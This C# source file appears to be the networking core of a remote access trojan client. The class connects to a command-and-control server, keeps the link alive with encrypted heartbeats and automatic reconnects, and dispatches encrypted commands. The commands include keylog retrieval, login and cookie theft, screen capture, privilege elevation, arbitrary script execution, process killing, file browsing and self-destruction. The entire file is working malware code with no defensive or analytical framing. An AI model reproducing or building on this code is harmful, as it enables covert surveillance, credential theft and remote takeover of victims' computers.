using Client.Config;
using Client.Core.Events;
using Client.Core.Security;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using NetworkCommsDotNet.Connections.TCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Core.Networking
{
    class NetworkManager
    {
        public static Connection Connection;
        public static bool IsConnected
        {
            get
            {
                if (Connection == null)
                    return false;
                else if (!RespondedToHeartbeat)
                    return false;
                else return true;
            }
        }

        private static bool RespondedToHeartbeat;
        
        public static void Connect()
        {
            try
            {
                Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT));
                RespondedToHeartbeat = true;
                SetupHandlers();
            }
            catch
            {

            }
        }   

        public static void Disconnect()
        {
            if(Connection != null && Connection.ConnectionAlive())
            {
                Connection.CloseConnection(false);
                Connection = null;
            }
            else
            {
                Connection = null;
            }
        }


        public static void SetupHandlers()
        {
            Connection.AppendIncomingPacketHandler<string>("0x05", (packetHeader, connection, incomingData) =>
            {
                GetOperatingSystem.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x01", (packetHeader, connection, incomingData) =>
            {
                GetAccountType.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x02", (packetHeader, connection, incomingData) =>
            {
                GetUserName.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x03", (packetHeader, connection, incomingData) =>
            {
                GetProcess.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x04", (packetHeader, connection, incomingData) =>
            {
                KillProcess.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x09", (packetHeader, connection, incomingData) =>
            {
                SubmitScreen.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x10", (packetHeader, connection, incomingData) =>
            {
                Close.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x12", (packetHeader, connection, incomingData) =>
            {
                Elevate.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x13", (packetHeader, connection, incomingData) =>
            {
                PressKey.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x15", (packetHeader, connection, incomingData) =>
            {
                OpenWebsite.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x16", (packetHeader, connection, incomingData) =>
            {
                ShowMessageBox.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x17", (packetHeader, connection, incomingData) =>
            {
                ExecuteScript.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x18", (packetHeader, connection, incomingData) =>
            {
                MouseEvent.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x19", (packetHeader, connection, incomingData) =>
            {
                GetKeylogChunk.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x20", (packetHeader, connection, incomingData) =>
            {
                GetKeylogDumpLength.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x21", (packetHeader, connection, incomingData) =>
            {
                GetDriveInfo.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x22", (packetHeader, connection, incomingData) =>
            {
                GetDirectorContent.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x23", (packetHeader, connection, incomingData) =>
            {
                RecoverLogin.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x24", (packetHeader, connection, incomingData) =>
            {
                RecoverCookies.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x25", (packetHeader, connection, incomingData) =>
            {
                GetUUID.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x26", (packetHeader, connection, incomingData) =>
            {
                GetSystemInfo.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("0x27", (packetHeader, connection, incomingData) =>
            {
                Destroy.Execute(Cryptography.Decrypt(incomingData));
            });
        }

        public static void StartReconnect()
        {
            ConnectionChecker();
        }

        private static void ConnectionChecker()
        {
            Thread t = new Thread(CheckConnection);
            t.Start();
        }

        private static void CheckConnection()
        {
            while(true)
            {
                string guid = Guid.NewGuid().ToString();
                try
                {
                    RespondedToHeartbeat = Cryptography.Decrypt(Connection.SendReceiveObject<string, string>("HeartbeatReq", "HeartbeatRep", 2000, Cryptography.Encrypt(guid))) == guid;
                }
                catch
                {
                    RespondedToHeartbeat = false;
                }

                if (!IsConnected)
                {
                    Connect();
                }
                Thread.Sleep(Settings.CNC_RECONNECT_TIME);
            }
        }
    }
}
